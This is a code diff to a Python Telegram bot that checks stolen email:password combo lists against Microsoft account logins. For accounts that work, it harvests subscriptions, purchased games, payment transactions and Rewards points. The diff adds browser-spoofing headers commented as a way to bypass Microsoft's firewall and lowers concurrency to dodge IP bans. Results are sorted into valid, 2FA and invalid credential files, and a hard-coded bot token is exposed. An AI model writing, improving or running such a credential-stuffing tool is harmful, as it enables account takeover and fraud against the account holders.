@@ -23,8 +23,8 @@ from aiogram.client.default import DefaultBotProperties
 # ============================================================
 BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
 ADMIN_IDS = [7595790309]
-MAX_CONCURRENT = 10
-TIMEOUT = 25
+MAX_CONCURRENT = 3 # Lowered to 3 to avoid instant IP bans on Render
+TIMEOUT = 20
 TEMP_DIR = "./temp"
 
 # SFTAG Config
@@ -32,12 +32,7 @@ SFTAG_CLIENT_ID = "00000000402B5328"
 SFTAG_URL = f"https://login.live.com/oauth20_authorize.srf?client_id={SFTAG_CLIENT_ID}&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 ATK_CLIENT_ID = "000000000004773A"
 
-UAS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-]
+UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 log = logging.getLogger("nyx")
@@ -52,22 +47,38 @@ def parse_lr(text: str, left: str, right: str) -> str:
         return ""
 
 # ============================================================
-# AUTH & API CHAIN (With Retry)
+# AUTH & API CHAIN
 # ============================================================
 async def sftag_login(session, email, password):
+    # Full browser headers to bypass Microsoft's basic WAF
+    headers = {
+        "User-Agent": UA_EDGE,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Sec-CH-UA": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+        "Sec-CH-UA-Mobile": "?0",
+        "Sec-CH-UA-Platform": '"Windows"'
+    }
+    
     for attempt in range(3):
-        headers = {"User-Agent": random.choice(UAS)}
         try:
             async with session.get(SFTAG_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                 if r.status == 429:
-                    await asyncio.sleep(2)
+                    await asyncio.sleep(3)
                     continue
                 body = await r.text()
                 post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
                 ppft = parse_lr(body, 'name="PPFT" value="', '"') or parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
                 
                 if not post_url or not ppft:
-                    await asyncio.sleep(1)
+                    await asyncio.sleep(2) # backoff
                     continue
 
                 payload = {
@@ -85,7 +96,7 @@ async def sftag_login(session, email, password):
                         if "identity/confirm" in loc or "recover" in loc:
                             return "2fa"
                         if "too many times" in text.lower() or r2.status == 429:
-                            await asyncio.sleep(2)
+                            await asyncio.sleep(3)
                             continue
                         continue
                         
@@ -94,54 +105,70 @@ async def sftag_login(session, email, password):
                     cid = cid.value.upper() if cid else ""
                     return {"ms_token": ms_token, "cid": cid}
         except Exception:
-            await asyncio.sleep(1)
+            await asyncio.sleep(2)
             
     return "error"
 
 async def get_pifd_atk(session):
     url = f"https://login.live.com/oauth20_authorize.srf?client_id={ATK_CLIENT_ID}&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
     try:
-        async with session.get(url, headers={"User-Agent": random.choice(UAS)}, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+        async with session.get(url, headers={"User-Agent": UA_EDGE}, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             loc = r.headers.get("Location", "")
             return parse_lr(loc, "access_token=", "&token_type")
     except: return ""
 
 async def get_payment_data(session, atk):
-    headers = {"User-Agent": random.choice(UAS), "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
+    headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
     result = {"subs": [], "points": "0"}
     now = datetime.datetime.utcnow()
 
-    # 1. Transactions (Subs & Games)
+    # 1. Transactions & Subs
     try:
         url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
         async with session.get(url2, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
-                text = await r.text()
+                try:
+                    data = await r.json()
+                except:
+                    data = {}
                 
-                # Parse Active Subscriptions
-                for m in re.finditer(r'"subscriptionId":"([^"]+)".*?"title":"([^"]+)".*?"nextRenewalDate":"([^"]+)"', text, re.DOTALL):
-                    title = m.group(2)
-                    next_date = m.group(3).split("T")[0]
+                # Parse Subscriptions
+                for sub in data.get("subscriptions", []):
+                    title = sub.get("title", "Unknown Sub")
+                    next_date_str = sub.get("nextRenewalDate", "")
                     
-                    try:
-                        dt = datetime.datetime.strptime(next_date, "%Y-%m-%d")
-                        if dt > now:
-                            result["subs"].append(f"{title} | Next Billing: {next_date}")
-                    except:
-                        result["subs"].append(f"{title} | Next Billing: {next_date}")
+                    is_active = False
+                    next_date = "N/A"
+                    
+                    if next_date_str:
+                        try:
+                            dt = datetime.datetime.strptime(next_date_str.split("T")[0], "%Y-%m-%d")
+                            next_date = next_date_str.split("T")[0]
+                            if dt > now:
+                                is_active = True
+                        except:
+                            is_active = True
+                    else:
+                        is_active = True
                         
-                # Parse Games / One-time Orders
-                for m in re.finditer(r'"orderId":"([^"]+)".*?"title":"([^"]+)"', text, re.DOTALL):
-                    title = m.group(2)
-                    if not any(title in s for s in result["subs"]):
+                    if is_active:
+                        sub_str = f"{title}"
+                        if next_date != "N/A":
+                            sub_str += f" | Next Billing: {next_date}"
+                        result["subs"].append(sub_str)
+                
+                # Parse One-time Orders (Games)
+                for order in data.get("orders", []):
+                    title = order.get("title", "Unknown Game")
+                    if title and not any(title in s for s in result["subs"]):
                         result["subs"].append(f"{title} (Game)")
-                                
+                        
     except: pass
 
     # 2. Rewards Points
     try:
         url3 = "https://rewards.bing.com/"
-        async with session.get(url3, headers={"User-Agent": random.choice(UAS)}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
+        async with session.get(url3, headers={"User-Agent": UA_EDGE}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 text = await r.text()
                 m = re.search(r'"availablePoints":(\d+)', text)
@@ -154,19 +181,24 @@ async def get_payment_data(session, atk):
 # MASTER CHECKER
 # ============================================================
 async def check_account(session, email, password):
-    res = {"email": email, "pw": password, "status": "bad", "data": None}
+    res = {"email": email, "pw": password, "status": "bad", "data": None, "error_reason": ""}
     
     jar = aiohttp.CookieJar(unsafe=True)
     async with aiohttp.ClientSession(cookie_jar=jar) as sftag_session:
         login_res = await sftag_login(sftag_session, email, password)
+        
         if login_res == "bad": return res
         if login_res == "2fa":
             res["status"] = "2fa"
             return res
         if login_res == "error":
             res["status"] = "error"
+            res["error_reason"] = "ip_block_or_ppft_fail"
             return res
-        if not login_res: return res
+        if not login_res: 
+            res["status"] = "error"
+            res["error_reason"] = "unknown_login_fail"
+            return res
             
         res["status"] = "valid"
         atk = await get_pifd_atk(sftag_session)
@@ -236,7 +268,7 @@ async def process_combos(combos, chat_id, status_msg, bot):
     write_file("Valid_No_Subscription.txt", valid_nosub)
     write_file("Invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
     write_file("2FA.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
-    write_file("Errors.txt", [f"{r['email']}:{r['pw']}" for r in errors])
+    write_file("Errors.txt", [f"{r['email']}:{r['pw']} | {r['error_reason']}" for r in errors])
 
     write_file("summary.txt", [f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Valid: {len(valid)}", f"Invalid: {len(bad)}", f"2FA: {len(tfa)}", f"Errors: {len(errors)}"])
 
@@ -244,7 +276,7 @@ async def process_combos(combos, chat_id, status_msg, bot):
     with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
         for fname in os.listdir(workdir): zf.write(os.path.join(workdir, fname), arcname=fname)
 
-    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nvalid: <b>{len(valid)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
+    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nvalid: <b>{len(valid)}</b>\nerrors: <b>{len(errors)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
     await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(valid)}_valid.zip"))
     shutil.rmtree(workdir, ignore_errors=True)
     try: os.remove(zip_path)
@@ -283,7 +315,7 @@ async def handle_file(msg: types.Message):
     os.remove(local)
     
     if not combos: return await status.edit_text("no valid combos found.")
-    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
+    await status_msg.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
     await process_combos(combos, msg.chat.id, status, bot)
 
 # ============================================================
